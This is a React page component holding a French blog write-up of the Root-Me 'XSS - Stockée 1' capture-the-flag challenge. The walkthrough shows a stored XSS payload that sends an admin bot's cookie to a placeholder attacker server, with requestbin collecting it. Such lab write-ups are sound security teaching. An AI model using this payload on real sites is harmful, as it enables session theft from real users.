import React from "react";
import { FaUserSecret } from "react-icons/fa";

import Lexical from "../../../Lexical";
import LayoutArticleBlog from "../../../LayoutArticleBlog";
import HeaderChallenge from "../../../HeaderChallenge";
import { Link } from "react-router-dom";
import photo1 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/1.png";
import photo2 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/2.png";
import photo3 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/3.png";
// import photo4 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/4.png";
import photo5 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/5.png";
import photo6 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/6.png";
import photo7 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/7.png";
import photo8 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/8.png";
import photo10 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/9.png";

import photo9 from "../../../../../assets/rootme/Web-Client/XSS-Stockée 1/Capture d’écran du 2024-05-06 17-35-23.png";

import ParticlesContainer2 from "../../../background Effect/Particles2";

import Footer from "../../../Footer";

const XssStocké1 = () => {
  return (
    <div className="xssStocké1 blogPage">
      <HeaderChallenge />
      <ParticlesContainer2 />
      <div className="blogContainer">
        <LayoutArticleBlog className="rootmeBackground">
          <h1>XSS - Stockée 1</h1>
          <div className="solution">
            Vous trouverez l'énoncé et le challenge à cette adresse <br />
            <span>
              <Link
                to="https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-1"
                target="_blank"
              >
                Root-ME <FaUserSecret />
              </Link>
            </span>
            <br />
            Au début du challenge, nous avons comme indice XSS Stockée en titre.
            <br />
            Nous tombons sur un formulaire de forum pour poster du texte.
            <br />
            On test le plus simple, si les balise {"<script>"} sont filtré dans
            les inputs.
            <img
              src={photo1}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpack Root ME"
            />
            Ok ca passe!
            <img
              src={photo2}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />
            Dans la console dévellopement nous constatons également dans
            l'onglet cookies qu'il ne sont pas transmis en "HTTonly" et donc ils
            peuvent y être accédé via Javascript.
            <img
              src={photo3}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />
            <br />2 exemples:
            <ul>
              <li>
                I- Pour récupérer son propre cookie dans une pop-up: <br />
                <strong> {"<script>alert('document.cookie')</script>"} </strong>
              </li>
              <li>
                II- Pour récupérer par celui qui va ouvrir le message (admin) ,
                récupérer(voler) son cookie et l'envoyer sur un serveur en
                écoute par l'attaquant:
                <br />
                <strong>
                  {" "}
                  {
                    '<script>document.write("<img src=http://votre-adresse-ip-ou-domaine:port/?tk="+document.cookie+" />");</script>'
                  }
                </strong>
              </li>
            </ul>
            {/* <img
              src={photo4}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            /> */}
            <img
              src={photo5}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />{" "}
            Dans cette exemple , on utislise un outils en ligne
            www.requestbin.com, outils qui permet de déboguer(lire) les requtes
            HTTP. d'autres solution en ligne possible.
            <img
              src={photo6}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />{" "}
            <img
              src={photo7}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />{" "}
            On récupere le endpoints sur lequel le service en ligne écoute et on
            compléte notre script pour le XSS.
            <img
              src={photo8}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />
            Aprés le passage du Bot qui nous confirme avoir lu le message sur le
            forum , on récupere son cookie en lecture sur notre serveur.
            <img
              src={photo10}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />{" "}
            Bingo, nous avons notre Flag !
            <img
              src={photo9}
              style={{ maxWidth: "450px" }}
              alt="Capture d'écran du challenge JavaScript webpck Root ME"
            />{" "}
          </div>
        </LayoutArticleBlog>

        <Lexical />
      </div>
      <Footer />
    </div>
  );
};

export default XssStocké1;
